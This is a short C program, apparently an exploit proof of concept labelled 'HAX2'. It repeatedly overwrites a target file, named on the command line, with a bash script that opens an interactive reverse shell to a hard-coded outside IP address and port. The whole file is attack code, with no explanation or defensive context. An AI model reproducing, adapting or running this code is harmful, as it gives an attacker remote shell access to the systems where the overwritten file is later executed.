#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>


int main(int argc, char **argv) {
    
    printf("HAX2: argv: %s\n", argv[1]);
    int res1 = -1;
    int total = 10000;
    while(total>0 && res1== -1){

        int fd = open(argv[1], O_RDWR|O_TRUNC);
        printf("HAX2: fd: %d\n", fd);

        const char *poc = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/3.36.86.135/4455 0>&1  &\n";
        int res = write(fd, poc, strlen(poc));
        printf("HAX2: res: %d, %d\n", res, errno);
        res1 = res;
        total--;
    }
}